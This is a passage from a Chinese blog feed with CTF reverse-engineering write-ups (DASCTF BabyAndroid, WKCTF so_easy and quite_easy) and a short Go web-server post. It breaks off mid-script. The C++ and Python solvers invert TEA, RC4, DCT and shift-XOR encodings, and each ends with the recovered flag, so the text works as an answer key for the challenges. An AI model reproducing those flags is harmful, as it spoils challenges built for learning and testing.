[ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> sum; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v4 -= (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (sum + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v5 -= (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (sum + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">10</span>] = &#123;</span><br><span class="line"><span class="number">0xBC2B4DF9</span>, <span class="number">0x6213DD13</span>, <span class="number">0x89FFFCC9</span>, <span class="number">0x0FC94F7D</span>, <span class="number">0x526D1D63</span>, <span class="number">0xE341FD50</span>, <span class="number">0x97287633</span>, <span class="number">0x6BF93638</span>,</span><br><span class="line"><span class="number">0x83143990</span>, <span class="number">0x1F2CE22C</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x12345678</span>, <span class="number">0x09101112</span>, <span class="number">0x13141516</span>, <span class="number">0x15161718</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt; <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">last[i] ^= last[<span class="number">0</span>];</span><br><span class="line">last[i + <span class="number">1</span>] ^= last[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dec</span>(last, key);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br><span class="line"># DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyAndroid"><a href="#BabyAndroid" class="headerlink" title="BabyAndroid"></a>BabyAndroid</h2><p>这个题如果没有套娃，我愿夸它，但是出题人知不知道我以为我要解完了结果才是刚刚开始有多么崩溃</p><p>首先题目给了抓包信息</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">charset</span><span class="punctuation">: </span>utf-8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>413</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">data</span>=TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+<span class="number">6</span>uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/<span class="number">5</span>uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==</span></span><br></pre></td></tr></table></figure><p>很明显data就是flag，然后要逆程序</p><p>jadx（原谅我安卓只会jadxQAQ）搜索yuanshen.com找到发送位置</p><p><img src="https://s2.loli.net/2024/07/21/mR4YMlZDWVLO7py.png" alt="image-20240721175844067"></p><p>然后它用反射调用了encrypt方法，没有搜索到，同时也没看到site.qifen.note.ui.Encrypto，然后详细看这段代码，发现它加载了sex.jpg然后解密作为dex，那么查看解密方法，解密dex，发现是rc4，直接复制为文本解密</p><p>然后看加密方式</p><p><img src="https://s2.loli.net/2024/07/22/giLMsU5YJQGAEWk.png" alt="image-20240721180421330"></p><p>得到密钥：0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D0D</p><p>解密数据得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">458</span>.<span class="number">853181</span>,-<span class="number">18</span>.<span class="number">325492</span>,-<span class="number">18</span>.<span class="number">251911</span>,-<span class="number">2</span>.<span class="number">097520</span>,-<span class="number">21</span>.<span class="number">198660</span>,-<span class="number">22</span>.<span class="number">304648</span>,<span class="number">21</span>.<span class="number">103162</span>,-<span class="number">5</span>.<span class="number">786284</span>,-<span class="number">15</span>.<span class="number">248906</span>,<span class="number">15</span>.<span class="number">329286</span>,<span class="number">16</span>.<span class="number">919499</span>,-<span class="number">19</span>.<span class="number">669045</span>,<span class="number">30</span>.<span class="number">928253</span>,-<span class="number">37</span>.<span class="number">588034</span>,-<span class="number">16</span>.<span class="number">593954</span>,-<span class="number">5</span>.<span class="number">505211</span>,<span class="number">3</span>.<span class="number">014744</span>,<span class="number">6</span>.<span class="number">553616</span>,<span class="number">31</span>.<span class="number">131491</span>,<span class="number">16</span>.<span class="number">472500</span>,<span class="number">6</span>.<span class="number">802400</span>,-<span class="number">78</span>.<span class="number">278577</span>,<span class="number">15</span>.<span class="number">280099</span>,<span class="number">3</span>.<span class="number">893073</span>,<span class="number">56</span>.<span class="number">493581</span>,-<span class="number">34</span>.<span class="number">576344</span>,<span class="number">30</span>.<span class="number">146729</span>,<span class="number">4</span>.<span class="number">445671</span>,<span class="number">6</span>.<span class="number">732204</span></span><br></pre></td></tr></table></figure><p>？？？什么玩意</p><p>然后再一看数据传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cipher</span> <span class="operator">=</span> (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]), NoteActivity.<span class="built_in">this</span>.sendInit(contentText));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还有一个sendInit</p><p>一看是个native，apktool解包，ida开</p><p><img src="https://s2.loli.net/2024/07/22/VmuI7E9RPlWzAGN.png" alt="image-20240721181218663"></p><p>可以找到encrypt函数</p><p>这里复制下来网上搜索可以查到，这个算法是DCT2，一维的，搜索可以看到：</p><p><a href="https://zh.wikipedia.org/wiki/%E7%A6%BB%E6%95%A3%E4%BD%99%E5%BC%A6%E5%8F%98%E6%8D%A2">离散余弦变换</a></p><p>但是DCT3并不可以直接逆向DCT2，查了很多资料也没查到</p><p>然后就看着佬的wp复现了</p><p>逆向时，把DCT3的$x_0&#x2F;2$去掉，然后后面处理相同，</p><p>同时对每个值乘以$\sqrt{\frac{2}{N}}$和$\sqrt{\frac{1}{N}}$也是在DCT2同样的位置处理，代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dct3</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">double</span>&gt;&amp; Y, std::vector&lt;<span class="type">double</span>&gt;&amp; X)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> N = Y.<span class="built_in">size</span>();</span><br><span class="line">X.<span class="built_in">resize</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; N; ++n) &#123;</span><br><span class="line"><span class="type">double</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; N; ++k) &#123;</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">1.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += Y[k] * std::<span class="built_in">cos</span>(<span class="number">3.14159265</span> * k * (n + <span class="number">0.5</span>) / N) * std::<span class="built_in">sqrt</span>(<span class="number">2.0</span> / N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">X[n] = sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; res = &#123; <span class="number">458.853181</span>,<span class="number">-18.325492</span>,<span class="number">-18.251911</span>,<span class="number">-2.097520</span>,<span class="number">-21.198660</span>,<span class="number">-22.304648</span>,<span class="number">21.103162</span>,<span class="number">-5.786284</span>,</span><br><span class="line"><span class="number">-15.248906</span>,<span class="number">15.329286</span>,<span class="number">16.919499</span>,<span class="number">-19.669045</span>,<span class="number">30.928253</span>,<span class="number">-37.588034</span>,<span class="number">-16.593954</span>,<span class="number">-5.505211</span>,</span><br><span class="line"><span class="number">3.014744</span>,<span class="number">6.553616</span>,<span class="number">31.131491</span>,<span class="number">16.472500</span>,<span class="number">6.802400</span>,<span class="number">-78.278577</span>,<span class="number">15.280099</span>,<span class="number">3.893073</span>,</span><br><span class="line"><span class="number">56.493581</span>,<span class="number">-34.576344</span>,<span class="number">30.146729</span>,<span class="number">4.445671</span>,<span class="number">6.732204</span> &#125;;</span><br><span class="line">std::vector&lt;<span class="type">double</span>&gt; X;</span><br><span class="line"><span class="built_in">dct3</span>(res, X);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">double</span> x : X) &#123;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> chr = (<span class="type">char</span>)std::<span class="built_in">round</span>(X[i]);</span><br><span class="line">std::cout &lt;&lt; chr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span></span><br></pre></td></tr></table></figure><hr><p>补充DCT变换公式（一维）：</p><p><img src="https://s2.loli.net/2024/07/22/VjwTGsU8gbd9Mqr.png" alt="image-20240722132702606"></p><p>逆变换</p><p><img src="https://s2.loli.net/2024/07/22/iSNuvny7QTjHwcE.png" alt="image-20240722132724585"></p><p>就按上面写的那样写就好了</p>]]></content>
    
    
    <summary type="html">打比赛(划掉)被比赛打</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
    <category term="汇编" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
    <category term="调试" scheme="https://www.pri87.vip/tags/%E8%B0%83%E8%AF%95/"/>
    
    <category term="套娃" scheme="https://www.pri87.vip/tags/%E5%A5%97%E5%A8%83/"/>
    
  </entry>
  
  <entry>
    <title>golang学习</title>
    <link href="https://www.pri87.vip/posts/484c947.html"/>
    <id>https://www.pri87.vip/posts/484c947.html</id>
    <published>2024-07-16T07:24:17.000Z</published>
    <updated>2024-07-16T07:28:04.533Z</updated>
    
    <content type="html"><![CDATA[<p>有点想学开发，这里先开一篇，之后补充</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi I love %s!&quot;</span>, r.URL.Path[<span class="number">1</span>:])</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个基本的网页</p><p>基本语法：</p><p><a href="https://www.runoob.com/go/go-tutorial.html">Go 语言教程 | 菜鸟教程 (runoob.com)</a></p>]]></content>
    
    
    <summary type="html">golang</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>WKCTF-RE部分wp</title>
    <link href="https://www.pri87.vip/posts/4f799b15.html"/>
    <id>https://www.pri87.vip/posts/4f799b15.html</id>
    <published>2024-07-16T01:08:28.000Z</published>
    <updated>2024-07-17T04:54:23.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="very-easy-该题未做出"><a href="#very-easy-该题未做出" class="headerlink" title="very_easy[该题未做出]"></a>very_easy[该题未做出]</h2><p>根据<a href="https://blog.csdn.net/Pisces50002/article/details/139580346">矩阵杯2024 Re wp 前两题-CSDN博客</a>这篇博客，遇到类似的题需要下载quickJS后在linux系统上make编译，并以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;quickjs-libc.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> qjsc_size = <span class="number">3881</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> qjsc[<span class="number">3884</span>] = &#123;</span><br><span class="line">   the_data</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  JSRuntime *rt;</span><br><span class="line">  JSContext *ctx;</span><br><span class="line">  rt = JS_NewRuntime();</span><br><span class="line">  ctx = JS_NewContextRaw(rt);</span><br><span class="line">  JS_SetModuleLoaderFunc(rt, <span class="literal">NULL</span>, js_module_loader, <span class="literal">NULL</span>);</span><br><span class="line">  JS_AddIntrinsicBaseObjects(ctx);</span><br><span class="line">  JS_AddIntrinsicDate(ctx);</span><br><span class="line">  JS_AddIntrinsicEval(ctx);</span><br><span class="line">  JS_AddIntrinsicStringNormalize(ctx);</span><br><span class="line">  JS_AddIntrinsicRegExp(ctx);</span><br><span class="line">  JS_AddIntrinsicJSON(ctx);</span><br><span class="line">  JS_AddIntrinsicProxy(ctx);</span><br><span class="line">  JS_AddIntrinsicMapSet(ctx);</span><br><span class="line">  JS_AddIntrinsicTypedArrays(ctx);</span><br><span class="line">  JS_AddIntrinsicPromise(ctx);</span><br><span class="line">  JS_AddIntrinsicBigInt(ctx);</span><br><span class="line">  js_std_add_helpers(ctx, argc, argv);</span><br><span class="line">  js_std_eval_binary(ctx, qjsc, qjsc_size, <span class="number">0</span>);</span><br><span class="line">  js_std_loop(ctx);</span><br><span class="line">  JS_FreeContext(ctx);</span><br><span class="line">  JS_FreeRuntime(rt);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我编译后报错version 2 expected 67. 然后就放弃了</p><h2 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h2><p>一个so的算法逆向</p><p>遇到so可以用多种架构的都看一下，防止某一个反编译出来比较奇怪。</p><p>逻辑大致是这样：</p><p><img src="https://s2.loli.net/2024/07/16/8F51fyzBTO4QNlK.png" alt="image-20240716091801464"></p><p>这种每个都要循环255次的，爆破怕是不现实，所以一定要找到两种操作对结果的不同影响。</p><p>可以发现：</p><p>input最高位为0时（input为正数），仅左移一位，最后0位为0<br>input最高位为1时（input为负数），左移再异或，最后0位为1</p><p>根据这一点来判断大小然后写算法逆向</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dec</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> mask = <span class="number">1LL</span> &lt;&lt; <span class="number">63</span>;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &amp; <span class="number">1</span>) &#123;</span><br><span class="line">last ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>) | mask;</span><br><span class="line">check++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">last = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)last &gt;&gt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">encode</span><span class="params">(<span class="type">long</span> <span class="type">long</span> input)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> loop = <span class="number">0xff</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> last = input;</span><br><span class="line"><span class="type">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &gt;= <span class="number">0</span>)</span><br><span class="line">last &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">last = (last &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x71234EA7D92996F5</span>LL;</span><br><span class="line">loop -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (loop);</span><br><span class="line"><span class="keyword">return</span> last;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> enc[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span class="number">0x3FC00F01B405AD5E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] = <span class="built_in">dec</span>(enc[i]);</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; enc[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)enc &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// WKCTF&#123;2366064af80f669c2cb9519ab&#125;</span></span><br></pre></td></tr></table></figure><h2 id="quite-easy"><a href="#quite-easy" class="headerlink" title="quite_easy"></a>quite_easy</h2><p>这个题最后连蒙带猜出来了QAQ</p><p>它hook了strcmp函数，在里面做加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = *(<span class="type">char</span> *)get_byte(j);</span><br><span class="line">  v5 = *(<span class="type">char</span> *)get_byte(j + <span class="number">32</span>) ^ v4;</span><br><span class="line">  v6 = *(_BYTE *)get_byte(j);</span><br><span class="line">  v7 = (_BYTE *)get_byte(j + <span class="number">32</span>);</span><br><span class="line">  sub_4C13E3(~(*v7 &amp; v6) &amp; v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">16</span>; k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = *(<span class="type">char</span> *)get_byte(k);</span><br><span class="line">  v9 = *(<span class="type">char</span> *)get_byte(k - <span class="number">16</span>) ^ v8;</span><br><span class="line">  v10 = *(_BYTE *)get_byte(k);</span><br><span class="line">  v11 = (_BYTE *)get_byte(k - <span class="number">16</span>);</span><br><span class="line">  sub_4C13E3(~(*v11 &amp; v10) &amp; v9);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">32</span>; ++m )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = (_BYTE *)get_byte(m);</span><br><span class="line">  *v14 -= *(_BYTE *)(m + a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密大概有这三个，sub_4C13E3专门用来放置内容到output</p><p>前面几个才是加密，这个加密方式当时是猜的，有点抽象，调不动，复现的时候验证了一下发现确实就是它写的那样加密的</p><p>由于调试时可以发现，它把随机生成的16位值拼在flag后面了，所以可以调试得到第一轮的参数，第二轮的参数就是flag的值，然后最后一轮用了传入的第二个字符串，就是那个假flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">last = [<span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x6F</span>, <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0x8C</span>, <span class="number">0xB4</span>, <span class="number">0x5B</span>, <span class="number">0x96</span>, <span class="number">0xC0</span>, <span class="number">0x59</span>, <span class="number">0xAC</span>, <span class="number">0x18</span>, <span class="number">0xDF</span>, <span class="number">0x2D</span>, <span class="number">0xCE</span>, <span class="number">0x3F</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xED</span>, <span class="number">0xD8</span>, <span class="number">0xD2</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0xF8</span>, <span class="number">0x23</span>, <span class="number">0x9F</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>]</span><br><span class="line"></span><br><span class="line">mask = [<span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x33</span>, 